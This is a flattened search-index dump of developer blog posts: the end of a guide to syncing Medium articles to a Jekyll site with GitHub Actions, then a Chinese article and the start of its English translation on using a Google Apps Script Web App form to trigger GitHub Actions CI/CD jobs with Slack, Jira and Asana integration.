https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. Click the edit button on the right 3. Set up the parameters for automatic synchronization of Medium articlesname: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10(UTC), everyday. # Set how often to automatically sync # ref: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # Replace zhgchgli_test with your Medium username # For example https://medium.com/@zhgchgli -&gt; zhgchgli # ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usageProvide a Medium account with access permissions (Cookies). If the article is behind a paywall, you must provide it. If you find that Medium articles are not fully synced (some are missing), it means they were blocked by Medium’s firewall during syncing, and you must also provide it.Steps to obtain Medium account cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID: Log in to a Medium account with access, go to the Medium Dashboard Right-click in the blank area Select “Inspect” Once the Developer Console appears, select “Application” Choose “Cookies” -&gt; “https://medium.com” Scroll down to find “sid” and “uid” Double-click to copy the values of these two fieldsSecurely store Medium account cookies in Github Repo Secrets1. Go to Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: Paste the sid value copied from the previous step 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: Paste the uid value copied from the previous step CompletionIf there is no special logout or issues with the account, the cookies will not expire.If the following message appears during synchronization and the articles are incomplete:This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.It means the cookies have expired, please reset them by following the steps above.4. First Manual Synchronization, Repo -&gt; Github Actions -&gt; Click “ZMediumToMarkdown” -&gt; Click “Enable workflow”For the first execution, we can manually synchronize once to check if the settings are correct.5. Wait for the synchronization of articles and website deployment to completeWait for the following three Actions to complete without errors: 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. Refresh the webpage to see the results, Enjoy! ⚠️ Please note! All file changes will trigger: 🟢 pages build and deployment 🟢 Build and Deploy You must wait for the above two deployment tasks to complete for the website changes to take effect.Jekyll Website ConfigurationBasic Website Settings ./_config.yml Be sure to update the url: to match your GitHub Pages URL and other website settings. Sharing feature settings: ./_data/share.yml Define article author information: ./_data/authors.ymlLeft Sidebar Settings ./tabs Bottom link buttons: ./_data/contact.ymlWebsite Footer and Other Text Content Settings ./locales/{Lang}.yml default is /locales/en.ymlLocal Testing Ensure your environment has Ruby &gt;= 3.1 installed and in use. cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ to see the results. Press Ctrl-c to stop.*Adjustments to the basic website configuration files require re-execution to take effect.Improve this page on Github.Follow Me on Medium 1K+ Followers 16 Total Views" }, { "title": "使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作", "url": "/posts/zrealm-dev/%E4%BD%BF%E7%94%A8-google-apps-script-web-app-%E8%A1%A8%E5%96%AE%E4%B8%B2%E6%8E%A5-github-action-ci-cd-%E5%B7%A5%E4%BD%9C-4cb4437818f2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, github-actions, slack, github", "date": "2025-01-11 19:19:43 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作Github Action Workflow 表單優化與整合其他工作流程工具(Jira, Asana, Slac...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script Web App 表單串接 Github Action CI/CD 工作Github Action Workflow 表單優化與整合其他工作流程工具(Jira, Asana, Slack. . )提升開發效率。左：原始的 Github Action Workflow Form / 右： 最終成果 (GAS Web App Form)2025/07 Update:此功能已整合到實際打包工具使用，可參考最新文章案例：「 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台 」背景之前的團隊使用 Github Action &amp; Self-hosted Github Runner + Slack 搭建整套 CI/CD 服務；整體效果不錯，對於 App 開發者來說建置與維護相對容易，只需照著官方文件提供的 YAML 參數完成設定就會自動觸發、機器方面也可以輕易的使用自己的機器當成 Runner 使用，服務本身都是由 Github 維護，我們不需在意版本升級等問題並且 Runner 是反向跟 Github 要任務下來做，不需要特別開對外網路開口；對團隊更好的事是，使用自己的 Runner 跑 Github Action 是完全免費的。 等於同時享受到類似 Bitrise 的 GUI YAML 建置方式又有像 Jenkins 那樣使用自架機器的彈性跟較低的建置成本，但不用像 Jenkins 那樣需要花時間維護服務本身。 未來有時間再寫一篇完整的 App CI/CD x Github Action 搭建過程。問題：Github Action CI/CD GUI FormGithub Action GUI Form 在 App 開發中，在 CD 觸發打包測試版、正式版或送審時通常會需要提供一些外部參數或是依照需求選擇環境、分支，才會開始執行工作。不同於 Jenkins 是自建服務，有完整的 Web GUI；Github Action 沒有，唯一的 Web GUI Form 是在 Actions 中點擊 Run workflow 可以自訂一個簡易的表單供使用者輸入外部參數，然後觸發 CI/CD 工作流程。通常會使用這個 CD 打包的使用者，不一定是 App 開發者本身、也不一定擁有這個專案的權限；例如 QA 需要打包指定版本、PM/Backend 需要打包某個開發中版本進行測試；Github Action Form 需要有該專案的權限才能使用，但使用者不要說能不能有專案權限、甚至是不一定有工程背景。而且我們無法在這邊做動態表單或資料驗證。 因此我們需要另外拉一個 GUI 服務給其他使用者操作使用。自建 Slack App 解決之前團隊是有熱愛做自動化的同仁自己用 Kotlin+Ktor 搭建了一個完整的 Slack App 網路服務，串接 Slack 訊息、表單、指令…等功能，接收、轉發 CD 打包請求，觸發 Github Action 執行操作並將結果串回 Slack。 目前沒有開發資源跟之前一樣使用 Kotlin+Ktor 建置服務自己寫 Web/iOS/macOS App 工具目前團隊原本是使用 Jenkins 有基礎的 Web 可以給其他使用者登入使用、另外還有自行開發了一個 App 串接 Jenkins 封裝一些參數讓非工程背景的使用者更方便使用。 不過遷移到 Github Action 之後這整套就廢棄了。❌ Private Github Pages應該有機會直接建置 Github Pages 來當 CI/CD Web GUI，但是目前只有 Github Enterprise 可以設定 Github Pages 存取權限，其他方案就算是 Private Repo 也會是公開的；無安全性可言。❌ Slack App，但使用 Google Apps Script 建置一開始想說依照之前團隊的經驗使用 Slack App 做為 CI/CD GUI Form 服務，但是目前沒有資源跟之前一樣使用 Kotlin+Ktor 建置服務；所以想說先使用 Function as a Service 服務快速嘗試建置。Function as a Service 有很多種， Cloud Functions 的自由度比較高，但由於組織 IT 限制，無法隨意新增 Public Cloud Functions 並且有收費問題；因此還是回到我們的老朋友 — Google Apps Script。 之前寫過好幾篇關於 Google Apps Script 做自動化的文章，有興趣的朋友可以參考： 1. 「 使用 Google Apps Script 實現每日數據報表 RPA 自動化 」 2. 「 簡單 3 步驟 — 打造免費 GA4 自動數據通知機器人 」 3. 「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」 4. 「 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 」總而言之，Google Apps Script 是 Google 另一個 Function as a Service 服務，主要特色是免費跟與 Google 服務之間可以快速整合；但是限制也較多，例如只能用它的語言、執行時間不能超過 6 分鐘、有執行次數上限、不支援多執行緒…等等，細節可以參考 我之前的文章 。結論是不可行，原因是： Function as a Service 冷啟動問題 。服務一段時間沒呼叫會進入睡眠，再次呼叫要花較長時間啟動(3~≥ 5 秒)； Slack App 對於 API 響應時間非常嚴格，服務需要在 3 秒內回應否則視為失敗 ，Slack 這邊就會直接噴錯誤、事件監聽也會被認為丟失，導致重複發送。 Google Apps Script doGet, doPost 方法無法取得 Headers。 這會導致無法走 官方的安全驗證 、無法關閉 Slack Retry 。 Google Apps Script 單執行緒問題。如果要串接其他服務響應時間都會超過 3 秒，直接被 Slack 判定為失敗。有勉強使用 Slack 訊息、Block Kit、Form 串接完整個流程，但是太容易觸發上述問題，後來直接放棄。 如果要做這套還是要走自己起伺服器、服務，不要走 Function as a Service! !❌ Slack Workflow FormSlack Workflow Form (❌ 無法客制化)另外也嘗試過 Slack 內建的自動化功能 Workflow Form，不過他無法做到動態表單內容 (e.g. 撈分支讓使用者選)，唯一能客製化的只有後續送資料的步驟。✅ Google Apps Script Web App GUI Form 表單山不轉路轉，轉念一想好像也不用糾結在一定要用 Slack 整合上，用 Slack 整合是最好的方案，因為是直接整進既有的團隊協作工具，不需要發散額外去學新工具；但是迫於資源限制，我們只能退而求其次找其他穩定又好用的方法。 回頭想到 Google Apps Script 本身就能部署成 Web App，可以在 Web doGet 時回應 GUI Form 表單，送出表單後觸發後續的 Github 串接處理。最終成果 🎉Demo Web App Form工作流程我們使用 Google Apps Script Web App 建置 CI/CD 表單，直接綁定 Google Workspace 帳號，設定只有組織內的使用者可以存取；自動獲取當前登入的使用者信箱、使用 Github Repo 共用帳號(或借用某個有權限的帳號)的 Personal Access Token 打 Github API 獲得分支列表，送出後同樣打 API 觸發 Github Action 開始執行 CI/CD 工作。另外，我們可以用使用者的信箱透過 Slack App 去打 Slack API，取得該使用者的 Slack ID，再透過 Slack App 傳送訊息，通知 CI/CD 任務執行情況。也可以再與其他工具、開發流程進行整合，例如先從 Asana, Jira 取得工單，選擇後再透過 Github API 查找分支、觸發 Github Action，最後再透過 Slack 通知給使用者。Step 1. 建立 Google Apps Script Web App Form前往 &gt; Google Apps Script ，新增專案。Step 2. 建立表單內容、GAS 程式太久沒有寫 HTML,CSS 也懶得自己設計樣式，直接請 ChatGPT 產一個有一點設計的 HTML 表單範本。在 GAS 左方檔案列表點「+」新增檔案，輸入檔案名稱「 Form.html 」並把 GPT 產的 HTML 表單範本內容貼上。Form.html：&lt;!--HTML &amp; Style Gen by ChatGPT 4o--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;&lt;?=title?&gt;&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f7f7f7; } .form-container { max-width: 600px; margin: auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); } .form-container h2 { margin-bottom: 20px; color: #333333; } .form-group { margin-bottom: 15px; } .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555555; } .form-group input, .form-group select, .form-group textarea { width: 95%; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px; } .form-group input[type=\"radio\"] { width: auto; margin-right: 10px; } .form-group .radio-label { display: inline-block; margin-right: 20px; } .form-group button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; } .form-group button:hover { background-color: #45a049; } .message { margin-top: 20px; padding: 15px; border-radius: 5px; font-size: 1em; text-align: center; } .message.success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; } .message.error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; } .hidden { display: none; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"form-container\"&gt; &lt;h2&gt;&lt;?=title?&gt;&lt;/h2&gt; &lt;form id=\"myForm\"&gt; &lt;div id=\"message-block\" class=\"hidden\"&gt;&lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"email\"&gt;電子郵件：&lt;/label&gt; &lt;input type=\"email\" value=\"&lt;?=email?&gt;\" readonly/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"buildNumber\"&gt;版本號：&lt;/label&gt; &lt;input type=\"number\" value=\"&lt;?=buildNumber?&gt;\"/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"branch\"&gt;Review 中的 PR：&lt;/label&gt; &lt;select id=\"branch\" name=\"branch\"&gt; &lt;option&gt;請選擇&lt;/option&gt; &lt;? pullRequests.forEach(pullRequest =&gt; { ?&gt; &lt;option value=\"&lt;?=pullRequest.head.ref?&gt;\"&gt;[&lt;?=pullRequest.state?&gt;] &lt;?=pullRequest.title?&gt;&lt;/option&gt; &lt;? }); ?&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"message\"&gt;更新內容：&lt;/label&gt; &lt;textarea id=\"message\" name=\"message\" rows=\"4\" placeholder=\"請輸入您的訊息\"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;button type=\"submit\"&gt;送出&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; function displayMessage(ok, message) { const messageBlock = document.getElementById('message-block'); messageBlock.className = ok ? 'message success' : 'message error'; messageBlock.innerHTML = message; messageBlock.classList.remove('hidden'); } document.getElementById(\"myForm\").addEventListener(\"submit\", function(e) { e.preventDefault(); const formData = new FormData(this); const formObject = Object.fromEntries(formData); google.script.run.withSuccessHandler((response) =&gt; { displayMessage(response.ok, response.message); }).processForm(formObject); }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;表單內容可依照需求自行調整。程式碼.gs：function doGet(e) { // 對應到左方檔案 Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // 取得使用者信箱，只限 執行身份：存取網頁程式的使用者 設定有效 const title = \"App CD 打包請求表單\"; const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = []; // 下一步在串接 Github... htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // 設定頁面寬度 return html}function processForm(object) { return {\"ok\": true, \"message\": \"請求送出成功！\"};}function genBuildNumber() { const now = new Date(); const formattedDate = Utilities.formatDate(now, \"Asia/Taipei\", \"yyyyMMddHHmmss\"); const milliseconds = now.getMilliseconds().toString().padStart(3, '0'); // 確保毫秒是 3 位數 return `${formattedDate}${milliseconds}`; }這一步，我們先把表單 GUI 完成，下一步再來串接 Github API 拿到 PR 分支列表。Step 2. 部署 Google Apps Script Web App Form我們先把剛剛的內容部署一次，查看結果。在 GAS 右上角選擇「部署」-&gt; 「新增部署作業」-&gt;「網頁應用程式」：執行身份跟誰可以存取分別可以設置成：執行身份： 我 統一都用你的帳號身分執行腳本。 存取網頁程式的使用者 會以當前登入的 Google 帳號使用者身份執行腳本。誰可以存取： 只有我自己 XXX 同個組織中的所有使用者 只有同組織＋已登入的 Google 帳號使用者可以存取。 所有已登入 Google 帳號的使用者 已登入的 Google 帳號使用者都可以存取。 所有人 不需要登入 Google 帳號、所有人都可以公開存取。 我們選擇「誰可以存取：XXX 同個組織中的所有使用者」＋「執行身份：存取網頁程式的使用者」就能 自動限制只有組織帳號的人可以使用 ，並且用他自己的身份執行！ 是一個很方便權限控管的功能！選完點擊右下「部署」。網頁應用程式中的網址，就是 Web App 存取網址。https://script.google.com/macros/s/AKfycbw8SuK7lLLMdY86y3jxMJyzXqa5tdxJryRnteOnNi-lK--j6CmKYXj7UuU58DiS0NSVvA/exec 網址很長很醜，但是沒辦法，只能自己找短網址工具縮短一下。點網址打開頁面查看效果：這邊要多提兩個 GAS 限制： GAS Web App 上方警告提示，預設無法隱藏 GAS Web App 是用 IFrame 把我們的頁面嵌在裡面，因此很難做到 100% RWD 效果只能使用 .setWidth() 調整視窗寬度Google Apps Script 授權警告第一次使用 、點擊「偵錯」或「執行」可能會出下以下授權警告：選擇想要執行的身份帳號，如果有出現「這個應用程式未經 Google 驗證」則點擊「進階」-&gt;「前往 XXX (不安全)」，選擇「允許」：如果 GAS 程式權限有變動(例如：多加存取 Google Sheet…etc)才會需要再重新授權，不然點過一次就不會再出現。 如遇到：已封鎖存取權「XXX」未完成 Google 驗證程序， 可參考我最新文章的 GCP 設定。Step 3. 串接 Github API 取得 PR 分支列表我們新增一個 Github.gs 程式檔案存放 Github API 相關邏輯。Github.gs：// SECRETconst githubPersonalAccessToken = \"\"// 使用你的 Github 帳號或組織共用的 Github 帳號創建 PAT// https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens// 方式 1: Restful API 存取function githubAPI(method, path, payload = null) { try { const url = \"https://api.github.com\"+path; var options = { method: method, headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" } }; if (method.toLowerCase().trim() == \"post\") { options.payload = JSON.stringify(payload); } const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// 方式 2: GraphQL 存取// Github API 部分更細的查詢功能只有 GraphQL API 有提供// https://docs.github.com/en/graphqlfunction githubGraphQL(query, variables) { const url = \"https://api.github.com/graphql\"; const payload = { query: query, variables: variables }; const options = { method: \"post\", contentType: \"application/json\", headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" }, payload: JSON.stringify(payload) }; try { const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// GraphQL Example:// const query = `// query($owner: String!, $repo: String!) {// repository(owner: $owner, name: $repo) {// pullRequests(states: OPEN, first: 100, orderBy: { field: CREATED_AT, direction: DESC }) {// nodes {// title// url// number// createdAt// author {// login// }// headRefName// baseRefName// body// }// pageInfo {// hasNextPage// endCursor// }// }// }// }// `;// const variables = {// owner: \"swiftlang\",// repo: \"swift\"// };// const response = githubGraphQL(query, variables);Github API 有兩種存取方式，一種是傳統的 Restful，另一種是更彈性的 GraphQL；本文以 Restful 為例。程式碼.gs：function doGet(e) { // 對應到左方檔案 Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // 取得使用者信箱，只限 執行身份：存取網頁程式的使用者 設定有效 const title = \"App CD 打包請求表單\"; const pullRequests = githubAPI(\"get\", \"/repos/swiftlang/swift/pulls\"); // 以 https://github.com/swiftlang/swift/pulls 為例 const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = pullRequests; htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // 設定頁面寬度 return html}function processForm(object) { if (object.buildNumber == \"\") { return {\"ok\": false, \"message\": \"請輸入版本號！\"}; } if (object.branch == \"\") { return {\"ok\": false, \"message\": \"請選擇分支版本！\"}; } // 帶上你要帶到 Github Action 的參數 const payload = { ref: object.branch, inputs: { buildNumber: object.buildNumber } }; // try { const response = githubAPI(\"post\", \"/repos/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/actions/workflows/CD-Job.yml/dispatches\", payload); // 以 https://github.com/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/blob/main/.github/workflows/CD-Job.yml 為例 return {\"ok\": true, \"message\": `打包請求發送成功!&lt;br/&gt;對應分支：&lt;strong&gt;${object.branch}&lt;/strong&gt;&lt;br/&gt;版號：&lt;strong&gt;${object.buildNumber}&lt;/strong&gt;`}; } catch (error) { return {\"ok\": false, \"message\": \"發生錯誤：\"+error.message}; }}processForm 方法中處理表單回傳的內容，也可以多加上更多吃GAS x Github API x Github Action這邊多補充一下對應到的 Github Action。CD-Job.yml：# CD 打包工作name: CD-Jobon: workflow_dispatch: inputs: buildNumber: # 對應 GAS payload.inpus.xxx description: '版本號碼' required: false type: string # ...More # Inputs 類型可參考官方文件：https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs jobs: some-job: runs-on: ubuntu-latest steps: - name: Print Inputs run: | echo \"Release Build Number: ${{ github.event.inputs.buildNumber }}\" Step 4. 重新部署 Google Apps Script Web App Form ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️GAS 右上角選擇「部署」-&gt; 選擇右上角「編輯」-&gt; 版本選擇「建立新版本」點擊「部署」-&gt; 完成。再回到網頁上重新整理，就能看到修改後的結果了： ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️ ⚠️請注意，GAS 程式碼的任何調整都需要重新部署，才會生效。⚠️Done! 🎉🎉🎉Demo Web App Form現在你可以在組織內分享這個連結給其他夥伴，他們可以直接使用這個網頁 GUI 執行 CI/CD 工作。延伸 (1)— 用使用者的信箱查詢 Slack User ID &amp; 發送、更新進度通知前文有提到，我們希望及時通知使用者 CI/CD 執行狀況，我們可以使用使用者提供的信箱去查 Slack User ID。Slack.gs：const slackBotToken = \"\"// https://medium.com/zrealm-robotic-process-automation/slack-chatgpt-integration-bd94cc88f9c9function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, // Use the bot token for authorization, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}// 用信箱查詢 Slask UIDfunction getSlackUserId(email) { return slackRequest(`users.lookupByEmail?email=${encodeURIComponent(email)}`)?.user?.id;}// 發送訊息給目標 Slack UID (channelID)function sendSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.thread_ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.postMessage\", content);}// 更新發送的訊息內容function updateSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.update\", content);}Slack API 使用請參考 官方文件 。Githun Action YAML 可以使用這個 Action 持續更新訊息、發送 Slack 訊息：# ...on: workflow_dispatch: inputs: buildNumber: # 對應 GAS payload.inpus.xxx description: '版本號碼' required: false type: string # ...More SLACK_USER_ID: description: 'Slack User Id for receive action notification' type: string SLACK_CHANNEL_ID: description: 'Slack Channel Id for receive action notification' type: string SLACK_THREAD_TS: description: 'Slack message ts' type: string jobs: # some jobs... if-deploy-failed-message: runs-on: ubuntu-latest if: failure() - name: update slack message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ github.event.inputs.SLACK_CHANNEL_ID }} ts: ${{ github.event.inputs.SLACK_THREAD_TS }} text: \"❌ 打包任務失敗，請檢查執行狀況結果或稍後再試。\\n&lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|點此查看執行狀況&gt; cc'ed &lt;@${{ github.event.inputs.SLACK_USER_ID }}&gt;\"效果： Slack App 串接細節可參考我之前的文章： Slack &amp; ChatGPT Integration 。延伸 (2) —查詢 Jira 工單Jira.gs：const jiraPersonalAccessToken = \"\"// https://confluence.atlassian.com/enterprise/using-personal-access-tokens-1026032365.htmlfunction getJiraTickets() { const url = `https://xxx.atlassian.net/rest/api/3/search`; // JQL query const jql = `project = XXX`; const queryParams = { jql: jql, maxResults: 50, // Adjust as needed }; const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraPersonalAccessToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const queryString = Object.keys(queryParams).map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`).join(\"&amp;\"); const response = UrlFetchApp.fetch(url + \"?\" + queryString + \"&amp;fields=\", options); // could specify only return some fields if (response.getResponseCode() === 200) { const issues = JSON.parse(response.getContentText()).issues; return issues; } else { Logger.log(`Error: ${response.getResponseCode()} - ${response.getContentText()}`); throw new Error(\"Failed to fetch Jira issues.\"); }} 其他 Jira API 使用請參考 官方文件 。延伸 (3) — 查詢 Asana 工單Asana.gs：const asanaPersonalAccessToken = \"\"// https://developers.asana.com/docs/personal-access-tokenfunction asanaAPI(endpoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"contentType\" : \"application/json\", \"headers\": { \"Authorization\": \"Bearer \"+asanaPersonalAccessToken } }; if (data != null) { options[\"payload\"] = JSON.stringify({\"data\":data}); } const url = \"https://app.asana.com/api/1.0\"+endpoint; const res = UrlFetchApp.fetch(url, options); const data = JSON.parse(res.getContentText()); return data;}// 查找 tasks in project// asanaAPI(\"/projects/PROJECT_ID/tasks\");其他 Asana API 使用請參考 官方文件 。總結自動化、工作及開發流程優化缺的永遠不是技術，而是想法；只要有想法我們都能找到適合的技術來實現，共勉之！2025/07 Update:此功能已整合到實際打包工具使用，可參考最新文章案例：「 CI/CD 實戰指南（四）：使用 Google Apps Script Web App 串接 GitHub Actions 建置免費易用的打包工具平台 」有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 183 Total Views Last Statistics Date: 2025-08-15 | 177 Views on Medium." }, { "title": "Using Google Apps Script Web App Forms to Integrate with GitHub Action CI/CD Workflows", "url": "/posts/zrealm-dev/en/using-google-apps-script-web-app-forms-to-integrate-with-github-action-ci-cd-workflows-4cb4437818f2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, github-actions, slack, github", "date": "2025-01-11 19:19:43 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Using Google Apps Script Web App Forms to Integrate with GitHub Action CI/CD Workflo...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Using Google Apps Script Web App Forms to Integrate with GitHub Action CI/CD WorkflowsOptimizing GitHub Action Workflow forms and integrating with other workflow tools (Jira, Asana, Slack…) to enhance development efficiency.Left: Original GitHub Action Workflow Form / Right: Final Result (GAS Web App Form)BackgroundThe previous team used GitHub Action &amp; Self-hosted GitHub Runner + Slack to set up a complete CI/CD service; the overall effect was good. For app developers, building and maintaining it was relatively easy. They just needed to follow the YAML parameters provided in the official documentation to complete the setup, which would automatically trigger. On the machine side, they could easily use their own machines as runners. The service itself is maintained by GitHub, so we don’t have to worry about version upgrades and other issues, and the runner pulls tasks from GitHub, so there’s no need to open external network ports. The best part for the team is that running GitHub Action on their own runner is completely free. This means we can enjoy a GUI YAML build method similar to Bitrise while having the flexibility and lower build costs of using self-hosted machines like Jenkins, without the need to spend time maintaining the service itself. I will write a complete article on the App CI/CD x GitHub Action setup process when I have time in the future.Problem: GitHub Action CI/CD GUI FormGitHub Action GUI Form In app development, when triggering CD to package a test version, production version, or for review, it usually requires providing some external parameters or selecting environments and branches according to needs before starting the workflow.Unlike Jenkins, which is a self-hosted service with a complete web GUI, GitHub Action does not have one. The only web GUI form is a simple form that users can fill out by clicking “Run workflow” in Actions to input external parameters and trigger the CI/CD workflow.Typically, users who package using this CD may not be the app developers themselves and may not have permissions for the project. For example, QA may need to package a specific version, or PM/Backend may need to package a certain development version for testing. The GitHub Action Form requires permissions for the project to use, but users may not have project permissions or even an engineering background.Moreover, we cannot create dynamic forms or data validation here. Therefore, we need to create another GUI service for other users to operate.Self-built Slack App SolutionPreviously, a team member who loved automation built a complete Slack App web service using Kotlin + Ktor, integrating Slack messages, forms, commands, etc., to receive and forward CD packaging requests, trigger GitHub Action operations, and send results back to Slack. Currently, we do not have development resources to build the service using Kotlin + Ktor as before.Custom Web/iOS/macOS App ToolThe team originally used Jenkins, which had a basic web interface for other users to log in, and also developed an app that integrated with Jenkins to package some parameters for non-engineering users to use more conveniently. However, after migrating to GitHub Action, this entire setup became obsolete.❌ Private GitHub PagesThere should be a chance to directly build GitHub Pages as a CI/CD web GUI, but currently, only GitHub Enterprise can set GitHub Pages access permissions. Other plans, even if they are private repos, will be public; there is no security to speak of.❌ Slack App, but using Google Apps Script for ConstructionInitially, I thought about using a Slack App as a CI/CD GUI Form service based on the previous team’s experience, but currently, we do not have resources to build the service using Kotlin + Ktor as before. So I thought about quickly trying to build it using Function as a Service.There are many types of Function as a Service, and Cloud Functions offers more flexibility. However, due to organizational IT restrictions, we cannot freely add Public Cloud Functions, and there are cost issues; thus, we return to our old friend — Google Apps Script. I have previously written several articles about automating with Google Apps Script; interested friends can refer to: 1. “Automating Daily Data Reports with Google Apps Script RPA“ 2. “Simple 3 Steps — Create a Free GA4 Automatic Data Notification Bot“ 3. “Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate“ 4. “Crashlytics + Big Query Creating a More Immediate and Convenient Crash Tracking Tool“In summary, Google Apps Script is another Function as a Service provided by Google, with the main features being free and quick integration with Google services. However, there are also many limitations, such as only being able to use its language, execution time cannot exceed 6 minutes, there are limits on execution counts, and it does not support multithreading, etc. For details, you can refer to my previous article.The conclusion is that it is not feasible due to: Function as a Service cold start issues.If the service is not called for a period, it goes to sleep, and calling it again takes longer to start (3~≥ 5 seconds); Slack App has very strict API response time requirements, and the service needs to respond within 3 seconds; otherwise, it is considered a failure, leading to errors from Slack and event listeners being considered lost, resulting in duplicate sends. Google Apps Script doGet, doPost methods cannot retrieve headers. This prevents us from using official security verification and from disabling Slack Retry. Google Apps Script single-threaded issues.If we need to connect to other services, the response time will 